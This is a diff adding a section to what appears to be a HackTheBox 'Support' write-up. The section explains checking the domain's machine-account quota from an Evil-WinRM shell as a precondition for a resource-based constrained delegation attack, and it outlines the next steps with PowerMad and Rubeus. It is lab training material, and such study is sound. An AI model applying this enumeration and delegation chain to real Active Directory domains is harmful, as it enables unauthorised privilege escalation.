@@ -1120,7 +1120,38 @@ sudo bloodhound-start        # http://localhost:8080  (login admin/admin)
 
 ### 4.4 Verify the Machine Account Quota
 
+RBCD requires adding a computer account to the domain; the `ms-DS-MachineAccountQuota` attribute controls whether an authenticated user is permitted to do so, so its value must be confirmed greater than zero before proceeding.
 
+**Command:** `Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota`
+
+**Breakdown:**
+
+- `Get-ADObject`
+    - **Description:** Retrieves an arbitrary Active Directory object and selected attributes.
+    - **Purpose:** Reads the domain object to inspect the machine-account quota.
+- `-Identity ((Get-ADDomain).distinguishedname)`
+    - **Description:** Targets the domain root object (`DC=support,DC=htb`).
+    - **Purpose:** The quota attribute lives on the domain object itself.
+- `-Properties ms-DS-MachineAccountQuota`
+    - **Description:** Requests a non-default attribute that isn't returned by default.
+    - **Purpose:** Surfaces the exact number of computers an authenticated user may add.
+
+**Result:**
+
+```shell
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
+
+
+DistinguishedName         : DC=support,DC=htb
+ms-DS-MachineAccountQuota : 10
+Name                      : support
+ObjectClass               : domainDNS
+ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e
+```
+
+**Key finding:** the quota is `10`, so `support` may add computer accounts to the domain — the final precondition for RBCD is met.
+
+**Next:** Upload the attack tooling (PowerMad, Rubeus), create an attacker-controlled computer account, and configure the DC to allow it to act on the DC's behalf.
 <div align="center">
 <br>
 <br>
